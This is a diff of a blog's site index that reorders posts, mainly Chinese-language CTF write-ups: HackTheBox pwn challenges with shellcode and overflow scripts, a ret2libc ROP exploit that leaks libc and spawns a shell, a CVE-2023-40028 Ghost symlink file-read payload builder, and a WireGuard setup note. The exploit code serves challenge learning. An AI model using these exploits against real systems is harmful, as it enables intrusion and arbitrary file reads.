@@ -642,66 +642,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Blog Banner</title>
-    <url>/2024/12/10/head/</url>
-    <content><![CDATA[<h2 id="Blog-summary"><a href="#Blog-summary" class="headerlink" title="Blog summary"></a>Blog summary</h2><ul>
-<li>CTF WriteUps</li>
-<li>Red Team</li>
-<li>courses</li>
-<li>Tools Cheatsheet</li>
-<li>Competition</li>
-<li>Research</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>cover</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackTheBox CTF Try Out - pwn</title>
-    <url>/2024/12/10/htb-ctf/</url>
-    <content><![CDATA[<h2 id="HackTheBox-CTF-Try-Out"><a href="#HackTheBox-CTF-Try-Out" class="headerlink" title="HackTheBox CTF Try Out"></a>HackTheBox CTF Try Out</h2><p>HackTheBox 平台上的新手導向 CTF</p>
-<p><a class="link"   href="https://ctf.hackthebox.com/event/details/ctf-try-out-1434" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Regularity"><a href="#Regularity" class="headerlink" title="Regularity"></a>Regularity</h3><p>這題的 read function 中有一個 overflow<br>因爲他什麼保護都沒開所以我們只需要把shellcode 寫進 stack 中，利用 <code>jmp rsi</code> gadget 就會跳到寫入 shellcode 的地方</p>
-<ul>
-<li>read function disassemble</li>
-</ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HJEwKiBNkx.png"
-                      alt="images"
-                ></p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;94.237.53.5&#x27;</span>,<span class="number">59584</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x402000</span></span><br><span class="line"></span><br><span class="line">sc =  asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        xor rax ,rax</span></span><br><span class="line"><span class="string">        mov rbx , 0x68732F6E69622F</span></span><br><span class="line"><span class="string">        push rbx</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 0x3b</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lea    rsi,[rsp]</span></span><br><span class="line">jmp_rsi = <span class="number">0x401041</span></span><br><span class="line"></span><br><span class="line">p = flat(sc, <span class="string">b&#x27;a&#x27;</span>* (<span class="number">0x100</span>-<span class="built_in">len</span>(sc)),jmp_rsi)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag.*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="為什麼是塞-0x100-不是-0x108"><a href="#為什麼是塞-0x100-不是-0x108" class="headerlink" title="為什麼是塞 0x100 不是 0x108"></a>為什麼是塞 0x100 不是 0x108</h4><p>這支程式在 function prologue&amp;Epilogue 都沒動到rbp，因為這樣所以不需要 + 0x8 蓋過 rbp</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">現代 x86-64 編譯器不修改 rbp 是合理的，尤其是函數使用 stack pointer (rsp) 來存取局部變數和函數參數，而不是使用 base pointer (rbp) 。</span><br><span class="line">現代編譯器（例如 GCC 和 Clang）在最佳化模式下會省略對 rbp 的操作，從而減少不必要的指令。</span><br><span class="line">這種方法叫做 frame pointer omission (FPO)。</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Abyss"><a href="#Abyss" class="headerlink" title="Abyss"></a>Abyss</h3><blockquote>
-<p>not yet</p>
-</blockquote>
-<h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><ul>
-<li>比對字串後有一個 <code>fgets</code>的 overflow 跳到 <code>escape_plan()</code> 就會輸出 flag</li>
-</ul>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.62.166&quot;</span> , <span class="number">45685</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> +p64(<span class="number">0x401256</span>) <span class="comment"># push rbp 後面</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;69&#x27;</span>) <span class="comment"># 第一次輸入完會比對字串 ==69 ，之後還有一次輸入有 Overflow</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/SJEno0BZ1g.png"
-                      alt="images"
-                ></p>
-<h3 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h3><blockquote>
-<p>ret2dl_resolve</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>HTB</tag>
-        <tag>CTF</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>LinkVortex | HackTheBox</title>
     <url>/2024/12/19/htb/</url>
     <content><![CDATA[<h2 id="LinkVortex"><a href="#LinkVortex" class="headerlink" title="LinkVortex"></a>LinkVortex</h2><blockquote>
@@ -797,7 +737,7 @@
                       alt="image"
                 ></a></p>
 <p><a class="link"   href="https://medium.com/@mukhammadiyev20040/linkvortex-htb-write-up-5fbc66cc0081" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#x47;&#104;&#x6f;&#x73;&#x74;&#x40;&#53;&#46;&#x35;&#x39;&#46;&#49;" >&#x47;&#104;&#x6f;&#x73;&#x74;&#x40;&#53;&#46;&#x35;&#x39;&#46;&#49;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
+<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#71;&#104;&#111;&#x73;&#116;&#64;&#x35;&#x2e;&#53;&#x39;&#46;&#x31;" >&#71;&#104;&#111;&#x73;&#116;&#64;&#x35;&#x2e;&#53;&#x39;&#46;&#x31;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>genrate_exp</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">generate_exploit</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">local</span> FILE_TO_READ=<span class="variable">$1</span></span><br><span class="line">  IMAGE_NAME=$(<span class="built_in">tr</span> -dc A-Za-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 13; <span class="built_in">echo</span>)</span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/</span><br><span class="line">  <span class="built_in">ln</span> -s <span class="variable">$FILE_TO_READ</span> <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/<span class="variable">$IMAGE_NAME</span>.png</span><br><span class="line">  zip -r -y <span class="variable">$PAYLOAD_ZIP_NAME</span> <span class="variable">$PAYLOAD_PATH</span>/ &amp;&gt;/dev/null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <ul>
@@ -823,33 +763,19 @@
       </tags>
   </entry>
   <entry>
-    <title>NCKUCTF ret2libc2024 WriteUp</title>
-    <url>/2024/08/16/ncku-ctf-ret2libc2024-WriteUp/</url>
-    <content><![CDATA[<h2 id="ret2lbic2024"><a href="#ret2lbic2024" class="headerlink" title="ret2lbic2024"></a>ret2lbic2024</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can you exploit buffer overflow in 2024?&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<hr>
-<blockquote>
-<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#x73;&#116;&#x64;&#x6f;&#117;&#116;&#64;&#71;&#x4c;&#x49;&#x42;&#x43;&#x5f;&#x32;&#x2e;&#50;&#x2e;&#x35;" >&#x73;&#116;&#x64;&#x6f;&#117;&#116;&#64;&#71;&#x4c;&#x49;&#x42;&#x43;&#x5f;&#x32;&#x2e;&#50;&#x2e;&#x35;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
-</blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/rop4-detmclone.png"
-                      alt="image"
-                ></p>
-<hr>
-<ul>
-<li>在leak的時候需要注意不能把<code>$rbp</code>寫壞，因為下次<code>gets()</code>還需要一個stack空間存東西，所以隨便找一個可寫的空間給<code>$rbp</code>跳過去後面才不會crash掉。</li>
-<li>為什麼 offset 不是用 <code>stdout@@GLIBC_2.2.5</code><br>  <code>stdout@@GLIBC_2.2.5</code> 是一個指向 <code>_IO_2_1_stdout_</code> 結構的指標，而 <code>_IO_2_1_stdout_</code> 是實際的 FILE 結構體。<br>  使用 <code>_IO_2_1_stdout_</code> 可以直接操作該結構體的memory，而不是通過指標間接訪問它。這樣可以避免偏移計算中的錯誤，也可以更精確地控制內存中的值。</li>
+    <title>Blog Banner</title>
+    <url>/2024/12/10/head/</url>
+    <content><![CDATA[<h2 id="Blog-summary"><a href="#Blog-summary" class="headerlink" title="Blog summary"></a>Blog summary</h2><ul>
+<li>CTF WriteUps</li>
+<li>Red Team</li>
+<li>courses</li>
+<li>Tools Cheatsheet</li>
+<li>Competition</li>
+<li>Research</li>
 </ul>
-<hr>
-<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">r= remote(<span class="string">&#x27;140.116.246.190&#x27;</span>,<span class="number">8789</span>)</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf 在設定rdi時 是用 mov rdi, rax</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">detmclone = <span class="number">0x4010d0</span> <span class="comment"># 會把rax設成 stdout</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x4011c5</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    bss,</span><br><span class="line">    ret,</span><br><span class="line">    detmclone,</span><br><span class="line">    mov_rdi_rax</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;2024?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;stdout -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.symbols[<span class="string">&#x27;stdout&#x27;</span>]))</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x21A780</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line">pop_rdi = l.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = l.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rax = l.address + <span class="number">0x45eb0</span></span><br><span class="line">pop_rdx_rbx = l.address + <span class="number">0x90529</span></span><br><span class="line">syscall = l.address + <span class="number">0x29db4</span></span><br><span class="line">sh = l.address + <span class="number">0x1D8698</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;sh: %s&quot;</span> % <span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sh,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    ret,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 ]]></content>
-      <categories>
-        <category>PWN</category>
-      </categories>
       <tags>
-        <tag>pwn</tag>
+        <tag>cover</tag>
       </tags>
   </entry>
   <entry>
@@ -2478,6 +2404,50 @@ Pwnable.tw</p>
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox CTF Try Out - pwn</title>
+    <url>/2024/12/10/htb-ctf/</url>
+    <content><![CDATA[<h2 id="HackTheBox-CTF-Try-Out"><a href="#HackTheBox-CTF-Try-Out" class="headerlink" title="HackTheBox CTF Try Out"></a>HackTheBox CTF Try Out</h2><p>HackTheBox 平台上的新手導向 CTF</p>
+<p><a class="link"   href="https://ctf.hackthebox.com/event/details/ctf-try-out-1434" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Regularity"><a href="#Regularity" class="headerlink" title="Regularity"></a>Regularity</h3><p>這題的 read function 中有一個 overflow<br>因爲他什麼保護都沒開所以我們只需要把shellcode 寫進 stack 中，利用 <code>jmp rsi</code> gadget 就會跳到寫入 shellcode 的地方</p>
+<ul>
+<li>read function disassemble</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJEwKiBNkx.png"
+                      alt="images"
+                ></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;94.237.53.5&#x27;</span>,<span class="number">59584</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x402000</span></span><br><span class="line"></span><br><span class="line">sc =  asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        xor rax ,rax</span></span><br><span class="line"><span class="string">        mov rbx , 0x68732F6E69622F</span></span><br><span class="line"><span class="string">        push rbx</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 0x3b</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lea    rsi,[rsp]</span></span><br><span class="line">jmp_rsi = <span class="number">0x401041</span></span><br><span class="line"></span><br><span class="line">p = flat(sc, <span class="string">b&#x27;a&#x27;</span>* (<span class="number">0x100</span>-<span class="built_in">len</span>(sc)),jmp_rsi)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag.*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="為什麼是塞-0x100-不是-0x108"><a href="#為什麼是塞-0x100-不是-0x108" class="headerlink" title="為什麼是塞 0x100 不是 0x108"></a>為什麼是塞 0x100 不是 0x108</h4><p>這支程式在 function prologue&amp;Epilogue 都沒動到rbp，因為這樣所以不需要 + 0x8 蓋過 rbp</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">現代 x86-64 編譯器不修改 rbp 是合理的，尤其是函數使用 stack pointer (rsp) 來存取局部變數和函數參數，而不是使用 base pointer (rbp) 。</span><br><span class="line">現代編譯器（例如 GCC 和 Clang）在最佳化模式下會省略對 rbp 的操作，從而減少不必要的指令。</span><br><span class="line">這種方法叫做 frame pointer omission (FPO)。</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Abyss"><a href="#Abyss" class="headerlink" title="Abyss"></a>Abyss</h3><blockquote>
+<p>not yet</p>
+</blockquote>
+<h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><ul>
+<li>比對字串後有一個 <code>fgets</code>的 overflow 跳到 <code>escape_plan()</code> 就會輸出 flag</li>
+</ul>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.62.166&quot;</span> , <span class="number">45685</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> +p64(<span class="number">0x401256</span>) <span class="comment"># push rbp 後面</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;69&#x27;</span>) <span class="comment"># 第一次輸入完會比對字串 ==69 ，之後還有一次輸入有 Overflow</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJEno0BZ1g.png"
+                      alt="images"
+                ></p>
+<h3 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h3><blockquote>
+<p>ret2dl_resolve</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>HTB</tag>
+        <tag>pwn</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>LYS SROP lab WriteUp</title>
     <url>/2024/08/20/srop-WriteUp/</url>
     <content><![CDATA[<blockquote>
@@ -2539,7 +2509,60 @@ Pwnable.tw</p>
         <category>PWN</category>
       </categories>
       <tags>
+        <tag>pwn</tag>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Wireguard VPN</title>
+    <url>/2024/07/31/wireguard/</url>
+    <content><![CDATA[<h2 id="Setup-wireguard-VPN"><a href="#Setup-wireguard-VPN" class="headerlink" title="Setup wireguard VPN"></a>Setup wireguard VPN</h2><blockquote>
+<p>要先有一台機器</p>
+<blockquote>
+<p>租個雲服務都可以，這邊推薦 <a class="link"   href="https://linode.com/" >Linode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</blockquote>
+</blockquote>
+<p><code>sudo apt install wireguard</code></p>
+<p><a class="link"   href="https://www.wireguard.com/install/" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>推薦使用<a class="link"   href="https://www.wireguardconfig.com/" >這個<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>生config檔 (我就懶👍)</p>
+<blockquote>
+<p>不然要用 <code>wg</code> 生Server,Client 的 private&#x2F;public key 然後寫conf</p>
+</blockquote>
+<p>把 Server File 丟進 <code>/etc/wireguard/wg0.conf</code> 後 <code>wg-quick up wg0</code><br>client File 丟進 app</p>
+<p>就行了💯</p>
+<p>這個改定位沒什麼用，只能改ip所以有GPS驗證的可能沒辦法跳過</p>
+]]></content>
+      <tags>
+        <tag>vpn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NCKUCTF ret2libc2024 WriteUp</title>
+    <url>/2024/08/16/ncku-ctf-ret2libc2024-WriteUp/</url>
+    <content><![CDATA[<h2 id="ret2lbic2024"><a href="#ret2lbic2024" class="headerlink" title="ret2lbic2024"></a>ret2lbic2024</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can you exploit buffer overflow in 2024?&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<blockquote>
+<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#x73;&#x74;&#x64;&#111;&#117;&#116;&#64;&#71;&#76;&#73;&#66;&#x43;&#x5f;&#50;&#46;&#50;&#46;&#x35;" >&#x73;&#x74;&#x64;&#111;&#117;&#116;&#64;&#71;&#76;&#73;&#66;&#x43;&#x5f;&#50;&#46;&#50;&#46;&#x35;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/rop4-detmclone.png"
+                      alt="image"
+                ></p>
+<hr>
+<ul>
+<li>在leak的時候需要注意不能把<code>$rbp</code>寫壞，因為下次<code>gets()</code>還需要一個stack空間存東西，所以隨便找一個可寫的空間給<code>$rbp</code>跳過去後面才不會crash掉。</li>
+<li>為什麼 offset 不是用 <code>stdout@@GLIBC_2.2.5</code><br>  <code>stdout@@GLIBC_2.2.5</code> 是一個指向 <code>_IO_2_1_stdout_</code> 結構的指標，而 <code>_IO_2_1_stdout_</code> 是實際的 FILE 結構體。<br>  使用 <code>_IO_2_1_stdout_</code> 可以直接操作該結構體的memory，而不是通過指標間接訪問它。這樣可以避免偏移計算中的錯誤，也可以更精確地控制內存中的值。</li>
+</ul>
+<hr>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">r= remote(<span class="string">&#x27;140.116.246.190&#x27;</span>,<span class="number">8789</span>)</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf 在設定rdi時 是用 mov rdi, rax</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">detmclone = <span class="number">0x4010d0</span> <span class="comment"># 會把rax設成 stdout</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x4011c5</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    bss,</span><br><span class="line">    ret,</span><br><span class="line">    detmclone,</span><br><span class="line">    mov_rdi_rax</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;2024?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;stdout -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.symbols[<span class="string">&#x27;stdout&#x27;</span>]))</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x21A780</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line">pop_rdi = l.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = l.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rax = l.address + <span class="number">0x45eb0</span></span><br><span class="line">pop_rdx_rbx = l.address + <span class="number">0x90529</span></span><br><span class="line">syscall = l.address + <span class="number">0x29db4</span></span><br><span class="line">sh = l.address + <span class="number">0x1D8698</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;sh: %s&quot;</span> % <span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sh,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    ret,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span 